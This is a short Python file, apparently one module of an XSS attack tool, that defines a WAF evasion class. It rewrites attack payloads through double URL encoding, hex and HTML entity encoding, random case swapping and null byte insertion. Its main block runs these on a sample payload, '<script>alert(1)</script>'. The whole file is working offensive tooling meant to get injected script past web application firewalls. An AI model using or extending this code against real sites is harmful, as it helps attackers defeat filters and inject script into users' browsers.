import random

class WAFEvasion:
    """Layer 3: WAF Evasion Techniques (XSStrike-style)"""
    def __init__(self):
        self.evasions = [
            self.double_url_encode,
            self.hex_encode,
            self.html_entity_encode,
            self.case_swap,
            self.null_byte_insertion
        ]

    def double_url_encode(self, payload):
        import urllib.parse
        return urllib.parse.quote(urllib.parse.quote(payload))

    def hex_encode(self, payload):
        return "".join(f"\\x{ord(c):02x}" for c in payload)

    def html_entity_encode(self, payload):
        return "".join(f"&#{ord(c)};" for c in payload)

    def case_swap(self, payload):
        return "".join(c.upper() if random.choice([True, False]) else c.lower() for c in payload)

    def null_byte_insertion(self, payload):
        return payload.replace("<", "<%00").replace(">", ">%00")

    def apply_evasion(self, payload):
        """Applies a random evasion technique to a payload."""
        evasion_func = random.choice(self.evasions)
        return evasion_func(payload)

if __name__ == "__main__":
    evader = WAFEvasion()
    test_payload = "<script>alert(1)</script>"
    print(f"Original: {test_payload}")
    print(f"Evaded: {evader.apply_evasion(test_payload)}")
